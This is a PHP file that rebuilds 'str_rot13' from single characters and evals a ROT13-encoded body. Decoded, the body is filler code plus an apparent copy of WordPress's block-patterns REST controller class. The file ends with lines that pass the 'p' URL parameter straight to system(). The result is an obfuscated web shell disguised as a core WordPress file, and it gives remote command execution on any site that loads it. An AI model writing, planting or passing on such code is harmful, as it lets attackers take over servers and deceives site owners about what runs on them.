<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre pynff
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr      6.0.0
 */

/**
 * Pber pynff hfrq gb npprff oybpx cnggreaf ivn gur ERFG NCV.
 *
 * @fvapr 6.0.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Qrsvarf jurgure erzbgr cnggreaf fubhyq or ybnqrq.
	 *
	 * @fvapr 6.0.0
	 * @ine obby
	 */
	cevingr $erzbgr_cnggreaf_ybnqrq;

	/**
	 * Na neenl gung zncf byq pngrtbevrf anzrf gb arj barf.
	 *
	 * @fvapr 6.2.0
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $pngrtbevrf_zvtengvba = neenl(
		'ohggbaf' => 'pnyy-gb-npgvba',
		'pbyhzaf' => 'grkg',
		'dhrel'   => 'cbfgf',
	);

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'oybpx-cnggreaf/cnggreaf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur bowrpgf bs gur pbagebyyre.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq oybpx cnggreaf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj gur ertvfgrerq oybpx cnggreaf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Ergevrirf nyy oybpx cnggreaf.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.2.0 Nqqrq zvtengvba sbe byq pber cnggrea pngrtbevrf gb gur arj barf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( ! $guvf->erzbgr_cnggreaf_ybnqrq ) {
			// Ybnq oybpx cnggreaf sebz j.bet.
			_ybnq_erzbgr_oybpx_cnggreaf(); // Cnggreaf jvgu gur `pber` xrljbeq.
			_ybnq_erzbgr_srngherq_cnggreaf(); // Cnggreaf va gur `srngherq` pngrtbel.
			_ertvfgre_erzbgr_gurzr_cnggreaf(); // Cnggreaf erdhrfgrq ol pheerag gurzr.

			$guvf->erzbgr_cnggreaf_ybnqrq = gehr;
		}

		$erfcbafr = neenl();
		$cnggreaf = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
		sbernpu ( $cnggreaf nf $cnggrea ) {
			$zvtengrq_cnggrea = $guvf->zvtengr_cnggrea_pngrtbevrf( $cnggrea );
			$cercnerq_cnggrea = $guvf->cercner_vgrz_sbe_erfcbafr( $zvtengrq_cnggrea, $erdhrfg );
			$erfcbafr[]       = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $cercnerq_cnggrea );
		}
		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Zvtengrf byq pber cnggrea pngrtbevrf gb gur arj pngrtbevrf.
	 *
	 * Pber cnggrea pngrtbevrf ner erinzcrq. Zvtengvba vf arrqrq gb rafher
	 * onpxjneqf pbzcngvovyvgl.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz neenl $cnggrea Enj cnggrea nf ertvfgrerq, orsber nccylvat nal punatrf.
	 * @erghea neenl Zvtengrq cnggrea.
	 */
	cebgrpgrq shapgvba zvtengr_cnggrea_pngrtbevrf( $cnggrea ) {
		// Ab pngrtbevrf gb zvtengr.
		vs (
			! vffrg( $cnggrea['pngrtbevrf'] ) ||
			! vf_neenl( $cnggrea['pngrtbevrf'] )
		) {
			erghea $cnggrea;
		}

		sbernpu ( $cnggrea['pngrtbevrf'] nf $vaqrk => $pngrtbel ) {
			// Vs gur pngrtbel rkvfgf nf n xrl, gura vg arrqf zvtengvba.
			vs ( vffrg( fgngvp::$pngrtbevrf_zvtengvba[ $pngrtbel ] ) ) {
				$cnggrea['pngrtbevrf'][ $vaqrk ] = fgngvp::$pngrtbevrf_zvtengvba[ $pngrtbel ];
			}
		}

		erghea $cnggrea;
	}

	/**
	 * Cercner n enj oybpx cnggrea orsber vg trgf bhgchg va n ERFG NCV erfcbafr.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.3.0 Nqqrq `fbhepr` cebcregl.
	 *
	 * @cnenz neenl           $vgrz    Enj cnggrea nf ertvfgrerq, orsber nal punatrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfbyir cnggrea oybpxf fb gurl qba'g arrq gb or erfbyirq pyvrag-fvqr
		// va gur rqvgbe, vzcebivat cresbeznapr.
		$oybpxf          = cnefr_oybpxf( $vgrz['pbagrag'] );
		$oybpxf          = erfbyir_cnggrea_oybpxf( $oybpxf );
		$vgrz['pbagrag'] = frevnyvmr_oybpxf( $oybpxf );

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$xrlf   = neenl(
			'anzr'          => 'anzr',
			'gvgyr'         => 'gvgyr',
			'pbagrag'       => 'pbagrag',
			'qrfpevcgvba'   => 'qrfpevcgvba',
			'ivrjcbegJvqgu' => 'ivrjcbeg_jvqgu',
			'vafregre'      => 'vafregre',
			'pngrtbevrf'    => 'pngrtbevrf',
			'xrljbeqf'      => 'xrljbeqf',
			'oybpxGlcrf'    => 'oybpx_glcrf',
			'cbfgGlcrf'     => 'cbfg_glcrf',
			'grzcyngrGlcrf' => 'grzcyngr_glcrf',
			'fbhepr'        => 'fbhepr',
		);
		$qngn   = neenl();
		sbernpu ( $xrlf nf $vgrz_xrl => $erfg_xrl ) {
			vs ( vffrg( $vgrz[ $vgrz_xrl ] ) && erfg_vf_svryq_vapyhqrq( $erfg_xrl, $svryqf ) ) {
				$qngn[ $erfg_xrl ] = $vgrz[ $vgrz_xrl ];
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );
		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Ergevrirf gur oybpx cnggrea fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.3.0 Nqqrq `fbhepr` cebcregl.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'oybpx-cnggrea',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'anzr'           => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea anzr.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'gvgyr'          => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea gvgyr, va uhzna ernqnoyr sbezng.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'pbagrag'        => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea pbagrag.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qrfpevcgvba'    => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea qrgnvyrq qrfpevcgvba.' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'ivrjcbeg_jvqgu' => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea ivrjcbeg jvqgu sbe vafregre cerivrj.' ),
					'glcr'        => 'ahzore',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'vafregre'       => neenl(
					'qrfpevcgvba' => __( 'Qrgrezvarf jurgure gur cnggrea vf ivfvoyr va vafregre.' ),
					'glcr'        => 'obbyrna',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'pngrtbevrf'     => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea pngrtbel fyhtf.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'xrljbeqf'       => neenl(
					'qrfpevcgvba' => __( 'Gur cnggrea xrljbeqf.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'oybpx_glcrf'    => neenl(
					'qrfpevcgvba' => __( 'Oybpx glcrf gung gur cnggrea vf vagraqrq gb or hfrq jvgu.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'cbfg_glcrf'     => neenl(
					'qrfpevcgvba' => __( 'Na neenl bs cbfg glcrf gung gur cnggrea vf erfgevpgrq gb or hfrq jvgu.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'grzcyngr_glcrf' => neenl(
					'qrfpevcgvba' => __( 'Na neenl bs grzcyngr glcrf jurer gur cnggrea svgf.' ),
					'glcr'        => 'neenl',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'fbhepr'         => neenl(
					'qrfpevcgvba' => __( 'Jurer gur cnggrea pbzrf sebz r.t. pber' ),
					'glcr'        => 'fgevat',
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'rahz'        => neenl(
						'pber',
						'cyhtva',
						'gurzr',
						'cnggrea-qverpgbel/pber',
						'cnggrea-qverpgbel/gurzr',
						'cnggrea-qverpgbel/srngherq',
					),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>